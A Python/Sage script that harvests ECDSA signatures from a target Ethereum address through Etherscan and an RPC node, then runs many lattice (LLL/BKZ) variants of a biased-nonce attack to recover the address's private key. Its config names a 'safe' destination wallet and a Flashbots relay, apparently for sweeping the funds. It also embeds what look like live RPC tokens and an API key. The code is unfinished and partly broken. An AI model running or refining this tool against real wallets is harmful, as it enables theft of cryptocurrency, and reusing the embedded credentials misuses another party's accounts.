from web3 import Web3
import rlp
import requests
import time
from eth_account import Account
from coincurve import PublicKey
from eth_utils import keccak, to_bytes, to_checksum_address
from eth_account._utils.legacy_transactions import Transaction
from eth_keys import keys
from sage.all import Matrix, ZZ, vector, QQ, RealField
from fpylll import IntegerMatrix, GSO, BKZ
import cryptocheck

# 1. Connect to an Ethereum Node (use your own RPC URL)
# RPC_URL = "https://small-ancient-replica.quiknode.pro/2aa3c69e6d3ac4f1ab4221ee8c9793e9f6e95532"
CONFIG = {
    # "RPC_URL": "https://Mainnet.infura.io/v3/70eacff3195c4af6af76fe8171529091",
    # "RPC_URL": "https://small-ancient-replica.ethereum-mainnet.quiknode.pro/2aa3c69e6d3ac4f1ab4221ee8c9793e9f6e95532",
    "RPC_URL": "https://attentive-wispy-owl.quiknode.pro/1bd932de9bb976cfe86a9ecd58675fd575d6d9f1",
    "ETHERSCAN_KEY": "CI3EABWI86DGFJ8PICBKRD6XSFQPPNMG3Z",
    "My_Addr": "0xf8AFf1b46E30ecBB6BFAD49513f18c4f31E3661e",
    "SAFE_DEST": "0xYourSafeWalletAddress",
    "RELAY_SIGNER": "0xYourbotRelaySignerKey", # For Flashbots Auth
    "EXPECTED_BIAS": 128, # Bits of nonce leakage (top 128 bits are 0)
}
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
# HALF_N = 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0
HALF_N = N // 2

w3 = Web3(Web3.HTTPProvider(CONFIG["RPC_URL"]))


def get_pub_key(z, r, s, v_val):
    signature = keys.Signature(vrs=(v_val, int(r, 16), int(s, 16)))
    public_key = signature.recover_public_key_from_msg_hash(decode_hex(z))
    print(f"Recovered Public Key: {public_key}")

def clean_hex(val):
    if not val: return b''
    if isinstance(val, bytes): return val
    return to_bytes(hexstr=val)

def get_legacy_tx_values(tx_hash):
    # Fetch transaction data
    tx = w3.eth.get_transaction(tx_hash)
    # print(tx)
    # Extract r, s, v directly from the transaction object
    r_hex = tx['r'].hex()
    s_hex = tx['s'].hex()
    v_val = tx['v']
    
    # 2. Reconstruct the 'z' (Message Hash)
    # For Pre-2016 (Frontier/Foundation) transactions, we use the 6 core fields
    # order: nonce, gasPrice, gasLimit, to, value, data
    
    
    s_int = int(s_hex, 16)
    # if int(v_val) == 28:
    #     s_int = N - s_int
    #     print("s-convert")
    r_int = int(r_hex, 16)
    
    # legacy_tx_fields = Transaction(
    #     nonce=tx['nonce'],
    #     gasPrice=tx['gasPrice'],
    #     gas=tx['gas'],
    #     to=clean_hex(tx['to']), # Handle contract creation (to is None)
    #     value=tx['value'],
    #     data=clean_hex(tx['input']),
    #     v=tx['v'], # Pass the actual v, r, s from your tx object
    #     # r=int(tx['r'].hex(), 16),
    #     # s=int(tx['s'].hex(), 16)
    #     r=r_int,
    #     s=s_int
    # )
    # print(clean_hex(tx['to']),clean_hex(tx['input']))
    print(int(tx['gasPrice'])," ",int(tx['gas']))
    legacy_tx_fields = [
        int(tx['nonce']),
        int(tx['gasPrice']),
        int(tx['gas']),
        clean_hex(tx['to']), # Handle contract creation (to is None)
        int(tx['value']),
        clean_hex(tx['input']),
    ]
    
    # RLP encode the fields to get the raw message that was signed
    unsigned_encoded = rlp.encode(legacy_tx_fields)
    # z_hash = keccak(unsigned_encoded).hex()
    # z_int = int(z_hash, 16)
    z_hash = keccak(unsigned_encoded)
    z_int = int.from_bytes(z_hash, byteorder='big')
    print(z_int)
    print(f"Transaction: {tx_hash}")
    print(f"z (Message Hash): {z_hash.hex()}")
    print(f"r: {r_hex}")
    print(f"s: {s_hex}")
    print(f"v: {v_val}")
    
    return z_int, r_int, s_int, v_val
    # return {
    #     "tx_hash": tx_hash,
    #     "z": int(z_hash, 16),
    #     "r": int(r_hex, 16),
    #     "s": s_int,
    #     "v": v_val
    # }

def is_old_tx_failed(tx_receipt):
    # If it's after Oct 2017, use status
    if 'status' in tx_receipt:
        return int(tx_receipt['status'], 16) == 0
    
    # For 2015-era, check if it consumed all gas
    return int(tx_receipt['gasUsed'], 16) == int(tx_receipt['gas'], 16)

def is_simple_tx(tx_receipt):
    return clean_hex(tx_receipt['input']) == b''

def get_live_signatures(address):
    """Phase 1: Real-time Signature Harvesting"""
    print(f"[{time.strftime('%H:%M:%S')}] Scanning history for {address}...")
    # api = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&sort=desc&apikey={CONFIG['ETHERSCAN_KEY']}"
    api = f"https://api.etherscan.io/v2/api?chainid=1&module=account&action=txlist&address={address}&sort=asc&apikey={CONFIG['ETHERSCAN_KEY']}"
    txs = requests.get(api).json().get('result', [])
    rLists = []
    zVerifiedCnt = 0
    sigs = []    
    vCnt = 0
    print(len(txs))
    leading_bias = 6

    minRLength = 64
    minRNonce = 1438
    for tx_data in txs:
        # if len(sigs) >= 20:
        #     print("ok")
        #     break # Higher count recommended for EIP-1559
        if len(sigs) >= 60:
            break
        print(tx_data)
        tx = w3.eth.get_transaction(tx_data['hash'])
        
        # break
        # 1483228800 is Jan 1, 2017
        # is_early = timestamp < 1483228800 
        is_failed_tx = is_old_tx_failed(tx_data)
        is_simpled_tx = is_simple_tx(tx_data)
        print(is_failed_tx)
        nonce = int(tx.get('nonce', 0))
        # if is_failed_tx == 1:
        #     print(tx_data)
        # if tx['from'].lower() == address.lower() and tx.get('type') == 0 and not is_failed_tx and is_simpled_tx and tx_data['blockNumber'] == '225930':
        if tx['from'].lower() == address.lower() and tx.get('type') == 0 and not is_failed_tx and is_simpled_tx and nonce >= minRNonce:
        # if tx['from'].lower() == address.lower() and tx.get('type') == 0 and not is_failed_tx:
            
            # print(nonce)
            z_int, r_int, s_int, v_int = get_legacy_tx_values(tx_data['hash'])
            # if minRLength > len(hex(r_int)) - 2:
            #     minRLength = len(hex(r_int)) - 2
            #     minRNonce = int(tx_data['nonce'])
            if cryptocheck.verify_z(z_int, r_int, s_int, v_int, address):
                vCnt += 1
            sigs.append((z_int, r_int, s_int, v_int))
            # if hex(r_int) not in rLists:
            #     rLists.append(hex(r_int))
            # else:
            #     print("found")
            #     break
            # print(tx['r'].hex())
            # r = tx['r'].hex()
            # r_str = format(r_int, '0256b') # Convert to 256-bit binary string
            # leading_zeros = len(r_str) - len(r_str.lstrip('0'))
            # if leading_zeros >= leading_bias:
            #     if hex(r_int) not in rLists:
            #         rLists.append(hex(r_int))
            #         sigs.append((z_int, r_int, s_int, v_int))
    # estimate_bias(rLists)
    print(vCnt)
    print(f"minRLength-{minRLength}, minRNonce-{minRNonce}")

    # is_uniqu_sigs(sigs)
    # solve_foundation_lattice(sigs, address)
    # solve_foundation_lattice_ZZ(sigs, address)
    solve_foundation_lattice_ftplll(sigs, address)
    # solve_foundation_centered_lattice_ZZ(sigs, address)
    # solve_foundation_trailing_lattice_ZZ(sigs, address)
    # solve_difference_lattice(sigs, address)
    # print(rLists)

def estimate_bias(r_list):
    """
    Estimates the number of leading zero bits across a set of r-values.
    """
    bias_counts = []
    for r in r_list:
        # Remove '0x' and count leading zeros
        r_str = format(int(r, 16), '0256b') # Convert to 256-bit binary string
        print(r_str,"\n")
        leading_zeros = len(r_str) - len(r_str.lstrip('0'))
        bias_counts.append(leading_zeros)
    
    avg_bias = sum(bias_counts) / len(bias_counts)
    print(f"[*] Average Leading Zero Bits: {avg_bias:.2f}")
    
    if avg_bias > 4:
        print("[!] LARGE BIAS DETECTED. Recovery is highly likely.")
    elif avg_bias > 1:
        print("[*] SMALL BIAS DETECTED. Will require many signatures.")
    else:
        print("[-] NO OBVIOUS BIAS. (Uniform distribution)")
        
    return avg_bias

def getAddress(hxW):
    hex_part = hxW.replace("0x", "")
    fixed_hex = hex_part.zfill(64)
    pr = "0x" + fixed_hex
    acc = Account.from_key(pr)
    return acc.address

def multi_verify_address(dLists, address):
    # print(dLists)
    for d in dLists:
        # if verify_address(d, address):
        if derive_2015_address(d, address):
            return True
    return False

def verify_address(d, target_address):
    """
    Verifies if the calculated private key d matches the target Ethereum address.
    """
    try:
        # 1. Convert integer d to 32-byte private key
        priv_key_bytes = int(d).to_bytes(32, byteorder='big')
        priv_key = keys.PrivateKey(priv_key_bytes)
        
        # 2. Derive the public key and then the address
        # eth-keys handles the Keccak-256 hashing internally
        # derived_address = priv_key.public_key.to_checksum_address()
        derived_address = priv_key.public_key.to_address()
        # print(derived_address)
        # 3. Compare (case-insensitive)
        return derived_address.lower() == target_address.lower()
    except Exception:
        return False
    
def derive_2015_address(priv_key_int, address):
    """
    Derives the Ethereum address from a private key using 2015-era logic.
    """
    try:
        # 1. Convert integer to 32 bytes
        priv_bytes = int(priv_key_int).to_bytes(32, 'big')
        
        # 2. Get the UNCOMPRESSED public key (65 bytes, starts with 0x04)
        pk = PublicKey.from_secret(priv_bytes)
        uncompressed_pk = pk.format(compressed=False) # This includes the 0x04 prefix
        
        # 3. Hash the public key (excluding the 0x04 prefix)
        # Ethereum addresses come from the last 20 bytes of the Keccak256 hash
        address_hash = keccak(uncompressed_pk[1:])
        address_bytes = address_hash[-20:]
        print(to_checksum_address(address_bytes))
        return to_checksum_address(address_bytes).lower() == address.lower()
    except Exception:
        return False
        # return "0x0"

def recover_pubkey(z_int, r_int, s_int, v_int):
    """
    Recovers the public key from a signature.
    z_int: the message hash (as integer)
    r_int, s_int, v_int: signature components
    """
    # Normalize v for recovery (Ethereum v is 27/28 or 37/38)
    if v_int >= 37:
        # EIP-155: v = chainId * 2 + 35 or 36
        # We need recovery_id (0 or 1)
        # Assuming Mainnet (chainId 1) for this example
        recovery_id = (v_int - 35) % 2
    else:
        # Pre-EIP-155: v = 27 or 28
        recovery_id = v_int - 27

    # Create the signature object
    signature = keys.Signature(vrs=(recovery_id, r_int, s_int))
    
    # Recover the public key using the message hash z
    z_bytes = z_int.to_bytes(32, 'big')
    public_key = signature.recover_public_key_from_msg_hash(z_bytes)
    
    return public_key.to_hex()

def is_uniqu_sigs(sigs):
    public_keys = set()
    for i, sig in enumerate(sigs):
        z, r, s, v = sig
        pub = recover_pubkey(z, r, s, v)
        public_keys.add(pub)
        print(f"Sig {i}: {pub}")
    if len(public_keys) == 1:
        print("\nSUCCESS: All signatures use the same key.")
    else:
        print(f"\nWARNING: Found {len(public_keys)} different keys.")

def check_z_final(l_matrix, normalized_sigs):
    row = l_matrix[0]
    k0 = abs(int(row[0])) % N
    k1 = abs(int(row[1])) % N

    # 3. Get the signature data for those two specific signatures
    z0, r0, s0 = normalized_sigs[0]
    z1, r1, s1 = normalized_sigs[1]

    # 4. Calculate the private key 'd' using BOTH
    for s0_test in [s0, N - s0]:
        for s1_test in [s1, N - s1]:
            d0 = (s0_test * k0 - z0) * pow(r0, -1, N) % N
            d1 = (s1_test * k1 - z1) * pow(r1, -1, N) % N
            print(f"Key from Sig 0: {hex(d0)}")
            print(f"Key from Sig 1: {hex(d1)}")
            
            if d0 == d1:
                print("Good")
    print("Bad")

    
# def solve_foundation_lattice(signatures, bias_bits, target_address):
def solve_foundation_lattice(signatures, target_address):
    m = len(signatures)
    if m < 2: return None

    # k < 2^(256 - bias_bits)
    found = False
    for bias_bits in range(1, 16):
        B = 2**(256 - bias_bits)
        print(B)
        
        # 1. NORMALIZE SIGNATURES (The Foundation Era Fix)
        # If v=28, we use the High-S complement (N-s) because early wallets
        # often signed that way. This ensures the math matches the k bias.
        normalized_sigs = []
        for z, r, s, v in signatures:
            if v == 28 or s > (N // 2):
            # if s >= HALF_N:
                s_fixed = N - s
            else:
                s_fixed = s
            # s_fixed = N - s
            normalized_sigs.append((z, r, s_fixed))

        # 2. CONSTRUCT MATRIX (Embedding Technique)
        print(f"[*] Building {m+2}x{m+2} lattice with {bias_bits} bits of bias...")
        L = Matrix(QQ, m + 2, m + 2)
        # L = Matrix(RealField(1024), m + 2, m + 2)
        

        for i in range(m):
            z, r, s = normalized_sigs[i]
            s_inv = pow(s, -1, N)
            
            t_i = (r * s_inv) % N
            u_i = (-(z * s_inv)) % N
            
            L[i, i] = N
            L[m, i] = t_i
            L[m + 1, i] = u_i

        # Scaling factors for the Embedding approach
        L[m, m] = B / N
        L[m + 1, m + 1] = B

        print("[*] Performing BKZ-40 reduction... started at 12:02 PM.")
        L_reduced = L.BKZ(block_size=30)
        print("---START---")

        # 3. ROBUST RECOVERY LOOP
        
        for row_idx, row in enumerate(L_reduced):
            # We check every signature position in the row
            for sig_idx in range(m):
                k_cand = abs(int(row[sig_idx]))
                
                if k_cand <= 1: continue
                
                # Use the normalized values for the recovery formula
                z, r, s = normalized_sigs[sig_idx]
                
                s_options = [s, N - s]
                # if v0 == 28: s_options = [N - s0_orig, s0_orig]
                # Formula: d = (s*k - z) * r^-1 mod N
                for s_tem in s_options:
                    d = ((s_tem * k_cand - z) * pow(r, -1, N)) % N
                    
                    # Verify against the Target Address
                    if verify_address(d, target_address):
                        found = True
                        # break
                        # print(f"\n[!!!] SUCCESS! Found Key in Row {row_idx}, Sig {sig_idx}")
                        # print(f"[!] Private Key: {hex(d)}")
                        # return d
                    
    print(found)
    # print("[x] No key found. Check Z-hashes or increase Bias Bits.")
    return None

def solve_foundation_lattice_ftplll(signatures, target_address):
  
    m = len(signatures)
    if m < 2: return None

    # k < 2^(256 - bias_bits)
    found = False
    # Iterate through bias ranges to find the "Sweet Spot"
    for bias_bits in range(12, 20, 1): 
        # B is our weight; it tells the lattice how much we trust the bias
        B = 2**(256 - bias_bits) 
        m = len(signatures)
        
        # 1. NORMALIZE SIGNATURES
        normalized_sigs = []
        for z, r, s, v in signatures:
            if s >= HALF_N:
                s_fixed = N - s
                z_fixed = N - z # Keep z/s relationship consistent
            else:
                s_fixed = s
                z_fixed = z
            normalized_sigs.append((z_fixed, r, s_fixed))

        # 2. CONSTRUCT MATRIX (Properly Scaled Embedding)
        print(f"[*] [{11:41} AM] Testing bias_bits: {bias_bits} (Weight B: {hex(B)})")
        # Use ZZ for the initial matrix to keep it clean for fpylll
        L = Matrix(ZZ, m + 2, m + 2)
        
        for i in range(m):
            z, r, s = normalized_sigs[i]
            s_inv = pow(s, -1, N)
            t_i = (r * s_inv) % N
            u_i = (-(z * s_inv)) % N
            
            L[i, i] = N
            L[m, i] = t_i
            L[m + 1, i] = u_i

        # CRITICAL SCALING FIX:
        # Column m (Private Key column) stays at 1
        L[m, m] = 1 
        # Column m+1 (The Bias column) MUST be scaled by B to work
        L[m + 1, m + 1] = B 

        # --- FPYLLL REDUCTION ---
        print(f"[*] Converting to fpylll and running BKZ-70...")
        A = IntegerMatrix.from_matrix(L)
        M = GSO.Mat(A) # Initialize GSO internally
        
        # EasyParam(70) is very deep; it's great for 65 sigs but takes time
        params = BKZ.EasyParam(70)
        # params = BKZ.Param(block_size=70, max_loops=10)
        BKZ.reduction(A, params)

        # Convert back to Sage for recovery
        L_reduced = A.to_matrix(L)

        # 3. ROBUST RECOVERY LOOP
        print("[*] Checking reduced rows...")
        for row_idx, row in enumerate(L_reduced):
            # 3a. Check for the Private Key directly in the 'd' column
            d_direct = abs(int(row[m])) % N
            if d_direct > 1:
                if multi_verify_address([d_direct, (N - d_direct) % N], target_address):
                    # print(f"\n[!!!] SUCCESS: Found Private Key in Row {row_idx} Column {m}")
                    # print(f"Key: {hex(d_direct)}")
                    found = True
                    # print(found)
                    # return

            # 3b. Check for the Nonce candidates
            for i in range(m):
                k_base = abs(int(row[i])) % N
                if k_base <= 1: continue
                
                z, r, s = normalized_sigs[i]
                r_inv = pow(r, -1, N)
                
                # Test variants including the "Fuzzer" for rounding drift
                for drift in range(-500, 501):
                    k_cand = (k_base + drift) % N
                    d_candidates = [
                        (s * k_cand - z) * r_inv % N,
                        (s * k_cand + z) * r_inv % N,
                        (s * (N - k_cand) - z) * r_inv % N,
                        (s * (N - k_cand) + z) * r_inv % N
                    ]
                    if multi_verify_address(d_candidates, target_address):
                        # print(f"\n[!!!] SUCCESS: Found via Nonce {i} in row {row_idx}")
                        found = True
                        # print(found)
                        # return
    print(found)

def solve_foundation_lattice_ZZ(signatures, target_address):
    m = len(signatures)
    if m < 2: return None

    # k < 2^(256 - bias_bits)
    found = False
    for bias_bits in range(4, 20, 1):
        B = 2**(256 - bias_bits)
        print(B)
        
        # 1. NORMALIZE SIGNATURES (The Foundation Era Fix)
        # If v=28, we use the High-S complement (N-s) because early wallets
        # often signed that way. This ensures the math matches the k bias.
        normalized_sigs = []
        for z, r, s, v in signatures:
            # if int(v) == 28 or s > (N // 2):
            if s >= HALF_N:
                print("big-one")
                s_fixed = N - s
                z_fixed = N - z
            else:
                s_fixed = s
                z_fixed = z
            # s_fixed = N - s
            normalized_sigs.append((z_fixed, r, s_fixed))

        # 2. CONSTRUCT MATRIX (Embedding Technique)
        print(f"[*] Building {m+2}x{m+2} lattice with {bias_bits} bits of bias...")
        L = Matrix(ZZ, m + 2, m + 2)
        # L = Matrix(RealField(1024), m + 2, m + 2)
        

        for i in range(m):
            z, r, s = normalized_sigs[i]
            s_inv = pow(s, -1, N)
            
            t_i = (r * s_inv) % N
            u_i = (-(z * s_inv)) % N
            # u_i = ((z * s_inv)) % N
            
            L[i, i] = N
            L[m, i] = t_i
            L[m + 1, i] = u_i

        # Scaling factors for the Embedding approach
        L[m, m] = 1 #set to 1 or B / N
        L[m + 1, m + 1] = 1 # set to 1 or B

        # print("[*] Performing BKZ-40 reduction... started at 12:02 PM.")
        # L_reduced = L.BKZ(block_size=40)

        # --- FPYLLL REDUCTION ---
        print(f"[*] Converting to fpylll IntegerMatrix...")
        A = IntegerMatrix.from_matrix(L)
        M = GSO.Mat(A)
        # Using BKZ-40 for high precision on 65 sigs
        # params = BKZ.Param(block_size=40, strategies=BKZ.DEFAULT_STRATEGY)

        # This automatically handles the strategy and max_loops for your block size
        params = BKZ.EasyParam(70) 
        
        print(f"[*] Starting BKZ-40 reduction at 08:48 AM. This may take a moment...")
        # BKZ.reduce(M, params)
        # BKZ.reduction(M, params)
        BKZ.reduction(A, params)
        # L_reduced = A.to_matrix(L)
        L_reduced = Matrix(QQ, [[A[i, j] for j in range(A.ncols)] for i in range(A.nrows)])

        print("---START---")

        # check_z_final(L_reduced, normalized_sigs)
        # return

        # 3. ROBUST RECOVERY LOOP

        for row_idx, row in enumerate(L_reduced):
            # print(row[0])
            # --- 1. DIRECT KEY CHECK ---
            # Column -2 is the Private Key column 'd'. Check it directly!
            d_direct = abs(int(row[-2])) % N
            if multi_verify_address([d_direct, (N - d_direct) % N], target_address):
                print(f"!!! SUCCESS:found directly in row {row_idx} column -2 !!!")
                found = True
                return
                break

            # --- 2. MATCHED NONCE CHECK ---
            # Only check the nonce (row[i]) against its OWN signature (sigs[i])
            for i in range(m):
                k_cand = abs(int(row[i])) % N
                if k_cand <= 1: continue
                
                z, r, s = normalized_sigs[i]
                r_inv = pow(r, -1, N)
                
                # Test the standard 4 variants for 2015 recovery
                d_candidates = [
                    (s * k_cand - z) * r_inv % N,
                    (s * k_cand + z) * r_inv % N,
                    (s * (N - k_cand) - z) * r_inv % N,
                    (s * (N - k_cand) + z) * r_inv % N
                ]
                
                if multi_verify_address(d_candidates, target_address):
                    print(f"!!! SUCCESS: found via Nonce {i} in row {row_idx} !!!")
                    found = True
                    return
                    break
        
        # for row_idx, row in enumerate(L_reduced):
        #     print(len(row))
        #     print(row[0]," ", row[-2])
        #     # break
        #     # We check every signature position in the row
        #     for sig_idx in range(m):
        #         for item_idx in range(len(row)):
        #         # for item_idx in [0, -2]:
        #             # k_cand = abs(int(row[sig_idx]))
        #             k_cand = abs(int(row[item_idx])) % N
                    
        #             if k_cand <= 1: continue
                    
        #             # Use the normalized values for the recovery formula
        #             z, r, s = normalized_sigs[sig_idx]
                    
        #             s_options = [s, N - s]
        #             # if v0 == 28: s_options = [N - s0_orig, s0_orig]
        #             # Formula: d = (s*k - z) * r^-1 mod N
        #             r_inv = pow(r, -1, N)
        #             for s_tem in s_options:
        #                 d_cans = [
        #                     ((s_tem * k_cand - z) * pow(r, -1, N)) % N,
        #                     ((s_tem * k_cand + z) * pow(r, -1, N)) % N,
        #                     (s_tem * (-k_cand) - z) * r_inv % N,  # Negative k
        #                     (s_tem * (-k_cand) + z) * r_inv % N,  # Negative k + Flipped Z
        #                     (s_tem * (N - k_cand) - z) * r_inv % N,
        #                     (s_tem * (N - k_cand) + z) * r_inv % N,
        #                     k_cand % N,
        #                     (N - k_cand) % N
        #                 ]
        #                 if multi_verify_address(d_cans, target_address):
        #                     found = True
        #                     print(found)
        #                     return
                            # break
                        # d = ((s_tem * k_cand - z) * pow(r, -1, N)) % N
                        # d1 = ((s_tem * k_cand + z) * pow(r, -1, N)) % N
                        # d2 = (s_tem * (-k_cand) - z) * r_inv % N  # Negative k
                        # d3 = (s_tem * (-k_cand) + z) * r_inv % N  # Negative k + Flipped Z
                        
                        # # Verify against the Target Address
                        # if verify_address(d, target_address) or verify_address(d1, target_address) or verify_address(d2, target_address)  or verify_address(d3, target_address):
                        #     found = True
                            # break
                            # return d
                    
    print(found)
    return None

def solve_foundation_centered_lattice_ZZ(signatures, target_address):
    m = len(signatures)
    if m < 2: return None

    # k < 2^(256 - bias_bits)
    found = False
    for bias_bits in range(1, 17):
        B = 2**(256 - bias_bits)
        shift = 2**(255 - bias_bits)
        print(B)
        
        # 1. NORMALIZE SIGNATURES (The Foundation Era Fix)
        # If v=28, we use the High-S complement (N-s) because early wallets
        # often signed that way. This ensures the math matches the k bias.
        normalized_sigs = []
        for z, r, s, v in signatures:
            # if int(v) == 28 or s > (N // 2):
            if s >= HALF_N:
                s_fixed = N - s
            else:
                s_fixed = s
            # s_fixed = N - s
            normalized_sigs.append((z, r, s_fixed))

        # 2. CONSTRUCT MATRIX (Embedding Technique)
        print(f"[*] Building {m+2}x{m+2} lattice with {bias_bits} bits of bias...")
        L = Matrix(ZZ, m + 2, m + 2)
        # L = Matrix(RealField(1024), m + 2, m + 2)
        

        for i in range(m):
            z, r, s = normalized_sigs[i]
            s_inv = pow(s, -1, N)

            # --- THE CENTERED FIX ---
            # Shift z to center the expected nonce at zero
            z_new = (z + (r * shift)) % N
            
            t_i = (r * s_inv) % N
            # u_i = (-(z * s_inv)) % N
            # u_i = ((z * s_inv)) % N
            u_i = (-z_new * s_inv) % N
            
            L[i, i] = N
            L[m, i] = t_i
            L[m + 1, i] = u_i

        # Scaling factors for the Embedding approach
        L[m, m] = 1 #set to 1 or B / N
        L[m + 1, m + 1] = B

        print("[*] Performing BKZ-40 reduction... started at 12:02 PM.")
        L_reduced = L.BKZ(block_size=45)
        print("---START---")

        # 3. ROBUST RECOVERY LOOP
        
        for row_idx, row in enumerate(L_reduced):
            # We check every signature position in the row
            for sig_idx in range(m):
                # k_cand = abs(int(row[sig_idx]))
                k_cand = abs(int(row[sig_idx])-shift)
                
                if k_cand <= 1: continue
                
                # Use the normalized values for the recovery formula
                z, r, s = normalized_sigs[sig_idx]

                z_new = (z + (r * shift)) % N
                #z_new = z
                
                s_options = [s, N - s]
                # if v0 == 28: s_options = [N - s0_orig, s0_orig]
                # Formula: d = (s*k - z) * r^-1 mod N
                for s_tem in s_options:
                    d = ((s_tem * k_cand - z_new) * pow(r, -1, N)) % N
                    d1 = ((s_tem * k_cand + z_new) * pow(r, -1, N)) % N
                    
                    # Verify against the Target Address
                    if verify_address(d, target_address) or verify_address(d1, target_address):
                        found = True
                        # break
                        # return d
                    
    print(found)
    return None

def solve_foundation_trailing_lattice_ZZ(signatures, target_address):
    m = len(signatures)
    if m < 2: return None

    # k < 2^(256 - bias_bits)
    found = False
    for bias_bits in range(3, 18):
        B = 2**(256 - bias_bits)
        shift_inv = pow(2**bias_bits, -1, N)
        shift_factor = 2**bias_bits
        print(B)
        
        # 1. NORMALIZE SIGNATURES (The Foundation Era Fix)
        # If v=28, we use the High-S complement (N-s) because early wallets
        # often signed that way. This ensures the math matches the k bias.
        normalized_sigs = []
        for z, r, s, v in signatures:
            # if int(v) == 28 or s > (N // 2):
            if s >= HALF_N:
                s_fixed = N - s
            else:
                s_fixed = s
            # s_fixed = N - s
            normalized_sigs.append((z, r, s_fixed))

        # 2. CONSTRUCT MATRIX (Embedding Technique)
        print(f"[*] Building {m+2}x{m+2} lattice with {bias_bits} bits of bias...")
        L = Matrix(ZZ, m + 2, m + 2)
        # L = Matrix(RealField(1024), m + 2, m + 2)
        

        for i in range(m):
            z, r, s = normalized_sigs[i]
            s_inv = pow(s, -1, N)

            # --- THE CENTERED FIX ---
            # Shift z to center the expected nonce at zero
            # z_new = (z + (r * shift)) % N
            
            t_i = (r * s_inv * shift_inv) % N
            u_i = (-z * s_inv * shift_inv) % N
            
            L[i, i] = N
            L[m, i] = t_i
            L[m + 1, i] = u_i

        # Scaling factors for the Embedding approach
        L[m, m] = 1 #set to 1 or B / N
        L[m + 1, m + 1] = B

        print("[*] Performing BKZ-40 reduction... started at 12:02 PM.")
        L_reduced = L.BKZ(block_size=40)
        print("---START---")

        # 3. ROBUST RECOVERY LOOP
        
        for row_idx, row in enumerate(L_reduced):
            # We check every signature position in the row
            for sig_idx in range(m):
                # k_cand = abs(int(row[sig_idx]))
                k_cand = abs(int(row[sig_idx]))
                
                if k_cand <= 1: continue
                k_cand = (k_cand * shift_factor) % N
                # Use the normalized values for the recovery formula
                z, r, s = normalized_sigs[sig_idx]

                s_options = [s, N - s]
                # if v0 == 28: s_options = [N - s0_orig, s0_orig]
                # Formula: d = (s*k - z) * r^-1 mod N
                for s_tem in s_options:
                    d = ((s_tem * k_cand - z) * pow(r, -1, N)) % N
                    d1 = ((s_tem * k_cand + z) * pow(r, -1, N)) % N
                    
                    # Verify against the Target Address
                    if verify_address(d, target_address) or verify_address(d1, target_address):
                        found = True
                        # break
                        # return d
                    
    print(found)
    return None

def solve_difference_lattice(sigs, address):
    """
    sigs: List of [z, r, s] from your 65 verified signatures
    """
    m = len(sigs)
    # The matrix size is (m+1)x(m+1) to account for d and the constant
    # We work on the differences between (i) and (i+1)
    matrix = Matrix(ZZ, m + 1, m + 1)
    
    # We define the relationship: (k_i+1 - k_i) = (u_i+1 - u_i) + d(t_i+1 - t_i)
    found = False
    for i in range(m - 1):
        z1, r1, s1, v1 = sigs[i]
        z2, r2, s2, v2 = sigs[i+1]
        
        # Ensure Low-S normalization
        if s1 > N//2: s1 = N - s1
        if s2 > N//2: s2 = N - s2
        
        s1_inv = pow(s1, -1, N)
        s2_inv = pow(s2, -1, N)
        
        # Calculate the relative differences
        t_diff = (r2 * s2_inv - r1 * s1_inv) % N
        u_diff = (z2 * s2_inv - z1 * s1_inv) % N
        
        matrix[i, i] = N
        matrix[m - 1, i] = t_diff
        matrix[m, i] = u_diff

    # --- THE WEIGHTING ---
    # Weight for the private key d
    matrix[m - 1, m - 1] = 1 
    # Weight for the nonce difference (set to 1 if nonces are perfectly +1)
    matrix[m, m] = 1 # nonces are not sequential setting to 1000

    print(f"Reducing difference matrix for sequential nonces...")
    reduced = matrix.BKZ(block_size=45)

    for row in reduced:
        # In a difference matrix, the 'd' candidate is often in the penultimate column
        d = abs(row[-2]) % N
        
        if d > 1:
            if verify_address(d, address):
                found = True
    print(found)
    return None

def solve_hnp_with_lll(signatures, bias_bits, address):
    """
    Solves the Hidden Number Problem using LLL.
    signatures: List of tuples [(z1, r1, s1), (z2, r2, s2), ...]
    bias_bits: Estimated number of leading zero bits in the nonce (k)
    """
    m = len(signatures)
    if m < 2:
        print("[-] Error: You need at least 2 signatures. 40+ recommended for small bias.")
        return None

    # Calculate the upper bound for the nonce k
    # k < 2^(256 - bias_bits)
    B = 2^(256 - bias_bits)
    
    print(f"[*] Constructing {m+2}x{m+2} lattice with {bias_bits} bits of bias...")
    
    # Initialize the Matrix
    # Using the 'Embedding' technique for higher accuracy
    L = Matrix(QQ, m + 2, m + 2)
    
    # 1. Fill the diagonal with the curve order N
    for i in range(m):
        L[i, i] = N
        
    # 2. Fill the last two rows with the HNP multipliers
    # t_i = r * s^-1 mod N
    # u_i = -z * s^-1 mod N
    for i in range(m):
        z, r, s = signatures[i]
        s_inv = pow(s, -1, N)
        t_i = (r * s_inv) % N
        u_i = (-(z * s_inv)) % N
        L[i, i] = N
        L[m, i] = t_i
        L[m + 1, i] = u_i
        
    # 3. Add the scaling factors to the last two columns
    L[m, m] = B / N
    L[m + 1, m + 1] = B
    
    print("[*] Performing LLL reduction... this may take a moment.")
    # L_reduced = L.LLL()
    L_reduced = L.BKZ(block_size=40)
    
    # 4. Search the reduced basis for the private key
    # for row in L_reduced:
    #     # Potential private key candidate
    #     # The shortest vector often contains the private key directly
    #     d_candidate = abs(row[m]) * N / B
        
    #     # Verify the candidate (Quick check against the first signature)
    #     # d = (s*k - z) * r^-1 mod N
    #     z1, r1, s1 = signatures[0]
    #     # In a real scenario, you'd check this against the Public Key or Address
    #     if d_candidate > 0 and d_candidate < N:
    #         # Check if this d actually satisfies the signature equation
    #         # (This part is theoretical; normally you check against a Public Key)
    #         print(getAddress(hex(int(d_candidate))))
    #         # print(f"Hex: {hex(int(d_candidate))}")
    #         # return d_candidate

    # for row in L_reduced:
    #     k_candidate = abs(row[0])
    #     z1, r1, s1 = signatures[0]
    #     # Calculate potential private key
    #     # d = (s*k - z) * r^-1 mod N
    #     d = ((s1 * k_candidate - z1) * pow(r1, -1, N)) % N
        
    #     if d > 100: # Simple check to skip zero/small rows
    #         print(getAddress(hex(int(d))))
    found = False
    for row_idx, row in enumerate(L_reduced):
        print(f"[*] Checking Row {row_idx}...")
        
        # Try every signature in the list as the "anchor" for this row
        for sig_idx, (z, r, s) in enumerate(signatures):
            # The i-th signature corresponds to the i-th element of the row
            k_cand = abs(int(row[sig_idx]))
            
            if k_cand <= 1: continue
            
